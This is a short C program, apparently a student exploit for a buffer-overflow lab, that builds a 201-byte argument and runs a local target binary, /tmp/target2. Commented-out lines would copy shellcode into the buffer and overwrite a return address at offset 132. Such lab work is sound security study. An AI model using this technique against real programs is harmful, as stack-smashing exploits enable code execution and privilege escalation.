#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  args[1] = malloc(202);
  memset(args[1],'a',201);
  //args[1][200] = 'a';
  args[1][201] = '\0';
  // memcpy(args[1], shellcode, strlen(shellcode));
  // *(unsigned int *)(args[1] + 132) = 0xbffffd78;
  printf("strlen of args[1] is: %d\n",strlen(args[1]));
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
